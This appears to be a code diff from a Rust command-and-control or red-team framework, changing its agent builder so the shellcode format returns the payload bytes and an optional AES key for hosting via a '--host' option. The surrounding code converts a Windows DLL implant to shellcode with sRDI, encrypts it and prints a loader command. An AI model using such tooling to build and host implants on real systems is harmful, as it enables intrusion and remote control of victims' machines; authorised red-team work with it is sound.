@@ -117,7 +117,14 @@ fn workspace_root() -> PathBuf {
         .to_path_buf()
 }
 
-pub fn build_agent(args: BuildAgentArgs) -> Result<()> {
+/// Build result for shellcode format: `(payload_bytes, aes_key_hex_if_encrypted)`.
+pub type ShellcodeResult = (Vec<u8>, Option<String>);
+
+/// Build the agent binary.
+///
+/// Returns `Some(ShellcodeResult)` when `format == Shellcode` so the caller
+/// can host the payload via `--host`. Returns `None` for exe/dll formats.
+pub fn build_agent(args: BuildAgentArgs) -> Result<Option<ShellcodeResult>> {
     // DLL / shellcode only make sense for Windows.
     if matches!(args.format, Format::Dll | Format::Shellcode)
         && !matches!(args.os, Os::Windows)
@@ -142,9 +149,15 @@ pub fn build_agent(args: BuildAgentArgs) -> Result<()> {
     );
 
     match args.format {
-        Format::Exe => build_exe(&root, &args, &cfg_json),
-        Format::Dll => build_dll(&root, &args, &cfg_json),
-        Format::Shellcode => build_shellcode(&root, &args, &cfg_json),
+        Format::Exe => {
+            build_exe(&root, &args, &cfg_json)?;
+            Ok(None)
+        }
+        Format::Dll => {
+            build_dll(&root, &args, &cfg_json)?;
+            Ok(None)
+        }
+        Format::Shellcode => build_shellcode(&root, &args, &cfg_json).map(Some),
     }
 }
 
@@ -210,7 +223,7 @@ fn build_dll(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<()> {
     copy_output(&bin_path, args, ".dll")
 }
 
-fn build_shellcode(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<()> {
+fn build_shellcode(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<ShellcodeResult> {
     use cat_agent::srdi::converter::{convert_dll_to_shellcode, SrdiFlags};
 
     // ── Step a: compile cat-agent as a Windows DLL ─────────────────────────
@@ -281,6 +294,7 @@ fn build_shellcode(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result
             enc_path.display(),
             key_hex
         );
+        Ok((blob, Some(key_hex)))
     } else {
         println!("[build-agent] step 3/3 — writing shellcode...");
         let bin_path = args.output_dir.join(&base_name);
@@ -293,9 +307,8 @@ fn build_shellcode(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result
             "[+] Run: shellcode_loader -f {} -m thread",
             bin_path.display()
         );
+        Ok((shellcode, None))
     }
-
-    Ok(())
 }
 
 /// Strip a `.bin` suffix from a name, leaving everything else intact.
